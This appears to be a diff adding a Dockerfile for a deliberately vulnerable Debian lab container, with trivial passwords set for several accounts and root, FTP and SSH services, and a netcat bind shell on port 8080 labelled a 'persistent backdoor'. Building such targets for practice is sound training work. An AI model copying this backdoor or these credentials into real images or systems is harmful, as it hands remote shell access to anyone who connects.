@@ -1,0 +1,37 @@
+FROM debian:11
+LABEL maintainer="ms109"
+SHELL ["/bin/bash", "-c"]
+
+# 1. Updated container system
+RUN apt update && apt upgrade -y
+
+# 2. Install tools
+RUN apt-get -y install systemctl openssh-server supervisor iproute2 vsftpd ftp openssh-server netcat-traditional
+
+# 3. Create some users
+RUN useradd -s /bin/bash -m test && echo test:123456789 | chpasswd 
+RUN useradd -s /bin/bash -m oracle && echo oracle:matrix | chpasswd 
+RUN useradd -s /bin/bash -m pi && echo pi:raspberry | chpasswd
+RUN useradd -s /bin/bash -m vagrant && echo vagrant:vagrant | chpasswd
+RUN useradd -s /bin/bash -m gohacking && echo gohacking:gohacking | chpasswd
+RUN echo root:gohacking | chpasswd
+
+# 4. Creating persistent backdoor using netcat
+RUN echo -e "#!/bin/bash\nexec nc -lvnp 8080 -e /bin/bash\n" > /bin/start.sh && chmod +x /bin/start.sh
+
+# Adjust the SSH server
+RUN mkdir -p /run/sshd
+
+# 4. Adjust the VSFTPD
+# Added the default directory to vsftpd working
+RUN mkdir -p /var/run/vsftpd/empty
+
+# 5. Configuring the supervisord
+COPY config_templates/supervisord/vsftpd.conf /etc/supervisor/conf.d/vsftpd.conf
+COPY config_templates/supervisord/ssh.conf /etc/supervisor/conf.d/ssh.conf
+COPY config_templates/supervisord/nc.conf /etc/supervisor/conf.d/nc.conf
+
+COPY config_templates/supervisord.conf /etc/supervisor/supervisord.conf
+
+# 6. Set Entryppoint
+ENTRYPOINT ["/usr/bin/supervisord", "-c", "/etc/supervisor/supervisord.conf"]
